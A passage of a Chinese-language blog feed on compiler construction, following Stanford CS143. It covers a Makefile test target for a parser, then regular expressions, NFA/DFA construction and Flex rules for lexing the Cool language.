class="number">2</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>  更改<strong>Makefile</strong>中的<strong>doteset</strong>目标<br>  分别调用自己实现的语法解析器和标准的语法解析器，处理<strong>./*cl</strong>和<strong>../../examples/*cl</strong>，并调用前面实现的<strong>cmp.py</strong>，比较输出结果，从而进行测试</p><p>  修改的<strong>Makefile</strong>目标如下所示<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">dotest:parser good.cl</span></span><br><span class="line">for file in $<span class="variable">$(find ../../examples/*.cl; find ./*.cl | grep -v bad.cl)</span>; do \</span><br><span class="line">basename=$<span class="variable">$(echo $$<span class="built_in">file</span> | awk -F / &#x27;&#123;print $$NF&#125;&#x27; | awk -F . &#x27;&#123;print $$1&#125;&#x27;)</span>; \</span><br><span class="line">../../bin/lexer $$file | ../../bin/parser &gt; $$basename.syntax; \</span><br><span class="line">./myparser $$file &gt; my$$basename.syntax; \</span><br><span class="line">python3 cmp.py $$basename $$basename.syntax my$$basename.syntax; \</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for file in $<span class="variable">$(find ./*.cl | grep bad.cl)</span>; do \</span><br><span class="line">basename=$<span class="variable">$(echo $$<span class="built_in">file</span> | awk -F / &#x27;&#123;print $$NF&#125;&#x27; | awk -F . &#x27;&#123;print $$1&#125;&#x27;)</span>; \</span><br><span class="line">../../bin/lexer $$file | ../../bin/parser 2&gt;$$basename.syntax; \</span><br><span class="line">./myparser $$file 2&gt;my$$basename.syntax; \</span><br><span class="line">python3 cmp.py $$basename $$basename.syntax my$$basename.syntax; \</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>  最终，其运行结果如下所示<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理-设计与实现</title>
      <link href="/2022/01/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/01/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这里通过学习<strong>StanFord CS143</strong>课程，学习编译相关的基础和原理</p><h2 id="编译器结构"><a href="#编译器结构" class="headerlink" title="编译器结构"></a>编译器结构</h2><p>  一般来说，目前的编译器包括如下<strong>五</strong>部分</p><ul><li><strong>Lexical Analysis</strong>(词法分析)</li><li><strong>Syntax Analysis/Parsing</strong>(语法分析)</li><li><strong>Semantic Analysis</strong>(语义分析)</li><li><strong>Optimization</strong>(代码优化)</li><li><strong>Code Generation</strong>(代码生成)</li></ul><h2 id="Lexical-Analysis"><a href="#Lexical-Analysis" class="headerlink" title="Lexical Analysis"></a>Lexical Analysis</h2><p>  词法分析是编译器的第一个阶段，其读入源程序的输入字符、将它们组成词素，生成并输出一个词法单元序列，每个词法单元对应于一个词素。</p><p>  目前实现词法分析通过如下几个步骤</p><ol><li>将词法模式转换为<strong>正则表达式</strong></li><li>将<strong>正则表达式</strong>转换为<strong>NFA</strong></li><li>将<strong>NFA</strong>转换为<strong>DFA</strong></li><li><p>实现<strong>DFA</strong></p><p><img src="词法分析实现流程.png" alt="词法分析实现流程"></p></li></ol><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>  通过定义一组基础的运算，则可以递归的定义出正则表达式</p><div class="table-container"><table><thead><tr><th style="text-align:center">运算</th><th style="text-align:center">定义和表示</th></tr></thead><tbody><tr><td style="text-align:center">Union</td><td style="text-align:center"><script type="math/tex">A + B = \{s \vert s \in A \ or \ s \in B\}</script></td></tr><tr><td style="text-align:center">Concatenation</td><td style="text-align:center"><script type="math/tex">AB = \{ab \vert a \in A \ and \ b \in B\}</script></td></tr><tr><td style="text-align:center">Iteration</td><td style="text-align:center"><script type="math/tex">A^{*} = \cup_{i = 0}^{\infty} A^{i}, where\ A^{i} = A^{i-1}A</script></td></tr></tbody></table></div><p>  那么在字母表<script type="math/tex">\Sigma</script>上的正则表达式含义如下所示</p><ol><li>如果<script type="math/tex">\epsilon</script>是正则表达式，则其表示<script type="math/tex">L(\epsilon) = \{\}</script></li><li>如果<script type="math/tex">a \in \Sigma</script>是正则表达式，则其表示<script type="math/tex">L(a) = \{"a"\}</script></li><li>如果<strong>r</strong>和<strong>s</strong>都是正则表达式，则<script type="math/tex">r + s</script>表示<script type="math/tex">L(r) + L(s)</script></li><li>如果<strong>r</strong>和<strong>s</strong>都是正则表达式，则<script type="math/tex">rs</script>表示<script type="math/tex">L(r)L(s)</script></li><li><p>如果<strong>r</strong>是正则表达式，则<script type="math/tex">r^{*}</script>表示<script type="math/tex">L(r)^{*}</script></p><p>实际上，通过制定合理的正则表达式，则可以匹配程序中所有的词素——关键字、标识符、数字常量以及空白等，从而完成词法分析</p></li></ol><h3 id="Nondeterministic-Finite-Automata"><a href="#Nondeterministic-Finite-Automata" class="headerlink" title="Nondeterministic Finite Automata"></a>Nondeterministic Finite Automata</h3><p>  一个不确定有穷自动机由以下几个部分组成</p><ol><li>一个有穷的<strong>状态集合</strong><script type="math/tex">S</script></li><li>一个输入符号集合<script type="math/tex">\Sigma</script>，即<strong>输入字母表</strong>。这里假设代表空串的<script type="math/tex">\epsilon</script>不是<script type="math/tex">\Sigma</script>的元素</li><li>一个<strong>转换函数</strong>，其为每个状态和<script type="math/tex">\Sigma \cup \{\epsilon\}</script>中的每一个符号给出其相应的后继状态的集合</li><li><script type="math/tex">S</script>中的一个状态<script type="math/tex">S_{0}</script>被指定为开始状态或初始状态</li><li><p><script type="math/tex">S</script>中的一个子集<script type="math/tex">F</script>被指定为接受状态或终止状态集合</p><p>根据上述描述，最终<strong>NFA</strong>可以通过一张转换图描述——从状态<strong>s</strong>到状态<strong>t</strong>存在一条标号为<strong>a</strong>的边，当且仅当状态<strong>t</strong>是状态<strong>s</strong>在输入<strong>a</strong>上的后继状态之一<br><strong>NFA</strong>具有如下性质:</p></li></ol><ul><li>同一个符号可以标记从同一个状态出发到达多个目标状态的多条边</li><li>一条边的标号不仅可以是输入字母表中的符号，也可以是空符号串<script type="math/tex">\epsilon</script><br><img src="NFA转换图.png" alt="NFA转换图"></li></ul><p>  而通过<strong><a href="http://cgosorio.es/Seshat/thompsonForm">McMaughton-Yamada-Thompson算法</a></strong>，可以轻松的实现<strong>正则表达式</strong>到<strong>NFA</strong>的转换，其规则如下所示</p><ol><li>对于正则表达式<script type="math/tex">\epsilon</script>，构造如下的<strong>NFA</strong><br><img src="NFA-epsilon.png" alt="NFA-epsilon"></li><li>对于<script type="math/tex">\Sigma</script>中的字符<script type="math/tex">a</script>的正则表达式，构造如下的<strong>NFA</strong><br><img src="NFA-sigma.png" alt="NFA-sigma"></li><li>对于正则表达式<script type="math/tex">s</script>和<script type="math/tex">t</script>，其对应的<strong>NFA</strong>分别为<strong>N(s)</strong>和<strong>N(t)</strong>，则对于正则表达式<script type="math/tex">s \vert t</script>，构造如下的<strong>NFA</strong><br><img src="NFA-union.png" alt="NFA-union"></li><li>对于正则表达式<script type="math/tex">s</script>和<script type="math/tex">t</script>，其对应的<strong>NFA</strong>分别为<strong>N(s)</strong>和<strong>N(t)</strong>，则对于正则表达式<script type="math/tex">st</script>，构造如下的<strong>NFA</strong><br><img src="NFA-concatenation.png" alt="NFA-concatenation"></li><li>对于正则表达式<script type="math/tex">s</script>，其对应的<strong>NFA</strong>为<strong>N(s)</strong>，则对于正则表达式<script type="math/tex">s^{*}</script>，构造如下的<strong>NFA</strong> <img src="NFA-iteration.png" alt="NFA-iteration"></li></ol><h3 id="Deterministic-Finite-Automata"><a href="#Deterministic-Finite-Automata" class="headerlink" title="Deterministic Finite Automata"></a>Deterministic Finite Automata</h3><p>  实际上，确定有穷自动机是不确定有穷自动机的一个特例。一个确定有穷自动机由以下几个部分组成</p><ol><li>一个有穷的<strong>状态集合</strong><script type="math/tex">S</script></li><li>一个输入符号集合<script type="math/tex">\Sigma</script>，即<strong>输入字母表</strong>。这里假设代表空串的<script type="math/tex">\epsilon</script>不是<script type="math/tex">\Sigma</script>的元素</li><li>一个<strong>转换函数</strong>，其为每个状态和<script type="math/tex">\Sigma \cup \{\epsilon\}</script>中的每一个符号给出其相应的后继状态的集合</li><li><script type="math/tex">S</script>中的一个状态<script type="math/tex">S_{0}</script>被指定为开始状态或初始状态</li><li><p><script type="math/tex">S</script>中的一个子集<script type="math/tex">F</script>被指定为接受状态或终止状态集合</p><p>根据上述描述，最终<strong>DFA</strong>可以通过一张转换图描述——从状态<strong>s</strong>到状态<strong>t</strong>存在一条标号为<strong>a</strong>的边，当且仅当状态<strong>t</strong>是状态<strong>s</strong>在输入<strong>a</strong>上的后继状态之一<br><strong>DFA</strong>具有如下性质:</p></li></ol><ul><li>没有输入<script type="math/tex">\epsilon</script>之上的转换动作</li><li>对每个状态<script type="math/tex">s</script>和每个输入符号<script type="math/tex">a</script>，有且只有一条标号为<script type="math/tex">a</script>的边离开<script type="math/tex">s</script><br><img src="DFA转换图.png" alt="DFA转换图"></li></ul><p>  而从<strong>NFA</strong>转换为<strong>DFA</strong>，实际上并不是非常困难，通过如下操作即可</p><div class="table-container"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><script type="math/tex">\epsilon</script>-closure(s)</td><td style="text-align:center">能够从<strong>NFA</strong>的状态<strong>s</strong>，只通过<script type="math/tex">\epsilon</script>转换到达的<strong>NFA</strong>状态集合</td></tr><tr><td style="text-align:center"><script type="math/tex">\epsilon</script>-closure(T)</td><td style="text-align:center">能够从<strong>T</strong>中某个<strong>NFA</strong>状态<strong>s</strong>，只通过<script type="math/tex">\epsilon</script>转换到达的<strong>NFA</strong>状态集合，即<script type="math/tex">\cup_{s \in T}\epsilon</script>-closure(s)</td></tr><tr><td style="text-align:center">move(T, a)</td><td style="text-align:center">能够从<strong>T</strong>中某个<strong>NFA</strong>状态<strong>s</strong>，通过标号为<strong>a</strong>转换到达的<strong>NFA</strong>状态的集合</td></tr></tbody></table></div><p>  然后执行如下算法，将<strong>NFA</strong>转换为<strong>DFA</strong><br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">T &lt;- s0</span><br><span class="line">Q &lt;- e_closure(s0)</span><br><span class="line">workList &lt;- &#123;s0&#125;</span><br><span class="line">while (workList != [])</span><br><span class="line">    remove T from workList</span><br><span class="line">    foreach (character c)</span><br><span class="line">        t &lt;- e_closure(move(T, c))</span><br><span class="line">        D[T, c] &lt;- t</span><br><span class="line">        if (t not in Q)</span><br><span class="line">            add t to Q and workList</span><br></pre></td></tr></table></figure></p><p>  而实际上，<strong>DFA</strong>实现起来是比较简单的，通过查表即可实现。<br>  这样，就实现了词法分析的整体流程</p><h1 id="PA2-Lexical-Analyzer"><a href="#PA2-Lexical-Analyzer" class="headerlink" title="PA2 Lexical Analyzer"></a>PA2 Lexical Analyzer</h1><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><p>  在该实验中，需要通过编写<strong>Flex</strong>规则，从而完成<strong>Cool</strong>的词法分析，并且返回<strong>token</strong>的类型和值。</p><p>  需要注意的是，实现的词法分析器应该具有足够的鲁棒性——可以在任何输入下都正常工作，即可以处理错误</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  该实验中依赖<strong>2.5.35</strong>版本的<strong>Flex</strong>，则在<code>assignments/PA2</code>目录执行如下命令设置环境<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">  &amp;&amp; <span class="built_in">sudo</span> apt-get install -y m4 \</span><br><span class="line">  &amp;&amp; (<span class="built_in">cd</span> ../../bin/flex; ./configure; make; <span class="built_in">sudo</span> make install)</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其<a href="https://gitee.com/jiaweihawk/stanford-compiler/tree/e8e3af78623340dd4d33019c4c8fb178a196a1ca/">实现</a></p><p>  实际上，这个实验就是定义解析<strong>Cool</strong>的<strong>Flex</strong>规则<br>  因此，需要了解<strong>Flex</strong>的使用方法——可以查看<a href="http://westes.github.io/flex/manual/">Flex的手册</a>。虽然版本不一致，但是整体并没有太大的区别。</p><p>  <strong>Cool</strong>语言中的词素大抵可以分为<strong>变量名称</strong>、<strong>变量类型</strong>、<strong>关键字</strong>、<strong>空白字符</strong>、<strong>整形常量</strong>、<strong>注释</strong>、<strong>字符串常量</strong>和<strong>有效字符</strong></p><h3 id="变量名称"><a href="#变量名称" class="headerlink" title="变量名称"></a>变量名称</h3><p>  根据<strong>cool-manual</strong>可知——变量名称由数字、字母和下划线组成，且其首字母小写。</p><p>  则基于此，可以很容易给出相关的正则表达式，并在<strong>Flex</strong>中给出相应的规则即可<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理变量名称情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">[a-z][a-zA-Z_0<span class="number">-9</span>]*              &#123;</span><br><span class="line">  cool_yylval.symbol = idtable.<span class="built_in">add_string</span>(yytext, yyleng);</span><br><span class="line">  <span class="keyword">return</span> OBJECTID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>  根据<strong>cool-manual</strong>可知——变量类型由数字、字母和下划线组成，且其首字母大写。</p><p>  则类似变量名称，可以很容易给出相关的正则表达式，并在<strong>Flex</strong>中给出相应的规则即可<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理变量类型情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">[A-Z][a-zA-Z_0<span class="number">-9</span>]*              &#123;</span><br><span class="line">  cool_yylval.symbol = idtable.<span class="built_in">add_string</span>(yytext, yyleng);</span><br><span class="line">  <span class="keyword">return</span> TYPEID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>  根据<strong>cool-manual</strong>可知，关键字就是保留的固定的字符串，包括<strong>class</strong>、<strong>else</strong>、<strong>false</strong>、<strong>fi</strong>、<strong>if</strong>、<strong>in</strong>、<strong>inherits</strong>、<strong>isvoid</strong>、<strong>let</strong>、<strong>loop</strong>、<strong>pool</strong>、<strong>then</strong>、<strong>while</strong>、<strong>case</strong>、<strong>esac</strong>、<strong>new</strong>、<strong>of</strong>、<strong>not</strong>、<strong>true</strong></p><p>  对于<strong>true</strong>和<strong>false</strong>来说，其首字母小写，其余字母可大写可小写；而对于其余的关键字来说，全部为小写。</p><p>  则<strong>Flex</strong>中的规则如下所示<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Define names for regular expressions here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*关键词相关的定义*/</span></span><br><span class="line"><span class="function">CLASS                   <span class="keyword">class</span></span></span><br><span class="line"><span class="function">ELSE                    <span class="keyword">else</span></span></span><br><span class="line"><span class="function">FI                      fi</span></span><br><span class="line"><span class="function">IF                      <span class="keyword">if</span></span></span><br><span class="line"><span class="function">IN                      in</span></span><br><span class="line"><span class="function">INHERITS                inherits </span></span><br><span class="line"><span class="function">ISVOID                  isvoid</span></span><br><span class="line"><span class="function">LET                     let</span></span><br><span class="line"><span class="function">LOOP                    loop</span></span><br><span class="line"><span class="function">POOL                    pool</span></span><br><span class="line"><span class="function">THEN                    then</span></span><br><span class="line"><span class="function">WHILE                   <span class="keyword">while</span></span></span><br><span class="line"><span class="function">CASE                    <span class="keyword">case</span></span></span><br><span class="line"><span class="function">ESAC                    esac</span></span><br><span class="line"><span class="function">NEW                     <span class="keyword">new</span></span></span><br><span class="line"><span class="function">OF                      of</span></span><br><span class="line"><span class="function">TRUE                    <span class="title">t</span><span class="params">(r|R)</span><span class="params">(u|U)</span><span class="params">(e|E)</span></span></span><br><span class="line"><span class="function">FALSE                   <span class="title">f</span><span class="params">(a|A)</span><span class="params">(l|L)</span><span class="params">(s|S)</span><span class="params">(e|E)</span></span></span><br><span class="line"><span class="function">LE                      &lt;</span>=</span><br><span class="line">DARROW                  =&gt;</span><br><span class="line">ASSIGN                  &lt;-</span><br><span class="line">NOT                     <span class="keyword">not</span></span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Keywords are case-insensitive except for the values true and false,</span></span><br><span class="line"><span class="comment">  * which must begin with a lower-case letter.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#123;DARROW&#125;                        &#123; <span class="built_in">return</span> (DARROW); &#125;</span><br><span class="line">&#123;CLASS&#125;                         &#123; <span class="keyword">return</span> CLASS; &#125;</span><br><span class="line">&#123;ELSE&#125;                          &#123; <span class="keyword">return</span> ELSE; &#125;</span><br><span class="line">&#123;FI&#125;                            &#123; <span class="keyword">return</span> FI; &#125;</span><br><span class="line">&#123;IF&#125;                            &#123; <span class="keyword">return</span> IF; &#125;</span><br><span class="line">&#123;IN&#125;                            &#123; <span class="keyword">return</span> IN; &#125;</span><br><span class="line">&#123;INHERITS&#125;                      &#123; <span class="keyword">return</span> INHERITS; &#125;</span><br><span class="line">&#123;ISVOID&#125;                        &#123; <span class="keyword">return</span> ISVOID; &#125;</span><br><span class="line">&#123;LET&#125;                           &#123; <span class="keyword">return</span> LET; &#125;</span><br><span class="line">&#123;LOOP&#125;                          &#123; <span class="keyword">return</span> LOOP; &#125;</span><br><span class="line">&#123;POOL&#125;                          &#123; <span class="keyword">return</span> POOL; &#125;</span><br><span class="line">&#123;THEN&#125;                          &#123; <span class="keyword">return</span> THEN; &#125;</span><br><span class="line">&#123;WHILE&#125;                         &#123; <span class="keyword">return</span> WHILE; &#125;</span><br><span class="line">&#123;CASE&#125;                          &#123; <span class="keyword">return</span> CASE; &#125;</span><br><span class="line">&#123;ESAC&#125;                          &#123; <span class="keyword">return</span> ESAC; &#125;</span><br><span class="line">&#123;NEW&#125;                           &#123; <span class="keyword">return</span> NEW; &#125;</span><br><span class="line">&#123;OF&#125;                            &#123; <span class="keyword">return</span> OF; &#125;</span><br><span class="line">&#123;NOT&#125;                           &#123; <span class="keyword">return</span> NOT; &#125;</span><br><span class="line">&#123;ASSIGN&#125;                        &#123; <span class="keyword">return</span> ASSIGN; &#125;</span><br><span class="line">&#123;LE&#125;                            &#123; <span class="keyword">return</span> LE; &#125;</span><br><span class="line">&#123;TRUE&#125;                          &#123;</span><br><span class="line">  cool_yylval.boolean = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">return</span> BOOL_CONST;</span><br><span class="line">&#125;</span><br><span class="line">&#123;FALSE&#125;                         &#123;</span><br><span class="line">  cool_yylval.boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> BOOL_CONST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><p>  根据<strong>cool-manual</strong>可知——空白字符包括<code>`、</code>\n<code>、</code>\f<code>、</code>\r<code>、</code>\t<code>、</code>\v`</p><p>  这里特别需要注意的是<code>\n</code>——因为其另起一行，因此还需要更新<strong>Flex</strong>中定义的<code>curr_lineno</code>即可<br>  最终<strong>Flex</strong>的规则如下所示</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*处理换行*/</span></span><br><span class="line">\n                              &#123; ++curr_lineno; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理其余空白情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">[ \f\r\t\v]                     &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="整形常量"><a href="#整形常量" class="headerlink" title="整形常量"></a>整形常量</h3><p>  根据<strong>cool-manual</strong>可知——整形常量就是全部由数字组成的词素</p><p>  因此其<strong>Flex</strong>规则也非常简单，如下所示<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理Integers情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+    &#123;</span><br><span class="line">  cool_yylval.symbol = inttable.<span class="built_in">add_string</span>(yytext, yyleng);</span><br><span class="line">  <span class="keyword">return</span> INT_CONST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>  注释可以简单分为单行注释和多行注释</p><ul><li>单行注释<br>从<strong>—</strong>开始一直到当前行结尾，则其<strong>Flex</strong>规则通过通配符实现，如下所示<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 处理单行注释情况</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">--.*$                           &#123;++curr_lineno;&#125;</span><br></pre></td></tr></table></figure></li><li><p>多行注释<br>根据<strong>cool-manual</strong>可知，注释涉及<strong>两次</strong>匹配(匹配开始<strong>(*</strong>、匹配结束<strong>*)</strong>)，因此可以使用<strong>Flex</strong>提供的<a href="http://westes.github.io/flex/manual/Start-Conditions.html#Start-Conditions">Condition语法糖</a><br>当匹配到多行注释起始模式<strong>(*</strong>后，其按照匹配的先后顺序可以分为如下几种情况</p><ol><li><em>)<br>这里则表示多行注释已经结束，则退出<strong>Flex</strong>的<em>*Condition</em></em>模式即可</li><li>\n<br>则更新<code>curr_lineno</code>，从而同步行号即可</li><li>&lt;<EOF>&gt;<br>此时已经到文件结尾，但是注释未闭合，则返回异常信息即可</li><li>.<br>剩余的情况，则直接忽略掉即可</li></ol><p>这里还需要注意的是，如果只有<strong>*)</strong>，则直接报错其未闭合即可。最终其<strong>Flex</strong>规则如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*注释相关的Condition*/</span></span><br><span class="line">%x comment</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;(*&quot;</span>                            &#123;<span class="built_in">BEGIN</span>(comment);&#125;</span><br><span class="line">&lt;comment&gt;&lt;&lt;EOF&gt;&gt;                &#123;</span><br><span class="line">  <span class="built_in">BEGIN</span>(INITIAL);</span><br><span class="line">  cool_yylval.error_msg = <span class="string">&quot;EOF in comment&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br><span class="line">&lt;comment&gt;<span class="string">&quot;*)&quot;</span>                   &#123;<span class="built_in">BEGIN</span>(INITIAL);&#125;</span><br><span class="line">&lt;comment&gt;\n                     &#123;++curr_lineno;&#125;</span><br><span class="line">&lt;comment&gt;.                      &#123;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理只有右侧comment的情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="string">&quot;*)&quot;</span>                            &#123;</span><br><span class="line">  cool_yylval.error_msg = <span class="string">&quot;Unmatched *)&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h3><p>  和前面的<strong>注释</strong>非常相似，涉及<strong>两次</strong>匹配(匹配开始<strong>“</strong>、匹配结束<strong>“</strong>)，因此可以使用<strong>Flex</strong>提供的<a href="http://westes.github.io/flex/manual/Start-Conditions.html#Start-Conditions">Condition语法糖</a></p><p>  当匹配到多行注释起始模式<strong>“</strong>后，其按照匹配的先后顺序，可以分为如下几种情况</p><ol><li>“<br>表示当前字符串常量已经结束，则退出<strong>Flex</strong>的<strong>Condition</strong>模式即可</li><li>\\n<br>表示当前字符串常量没有结束，下一行也属于字符串常量，但要注意更新<code>curr_lineno</code></li><li>\0<br><strong>Cool</strong>中的字符串常量不允许包含<code>\0</code>，则跑出相关异常即可</li><li>\b、\t、\n、\f<br>会被转移成相对应的字符</li><li>\.<br>剩余的转义模式，仅仅保留后面的字符即可</li><li>&lt;<EOF>&gt;<br>此时已经到文件结尾，但是字符串常量未闭合，则返回异常信息即可</li><li><p>.<br>剩余情况，则直接保留近字符串常量中</p><p>这里还需要注意如果字符串长度过长的问题，通过判断当前存储的字符个数即可实现。最终其<strong>Flex</strong>规则如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 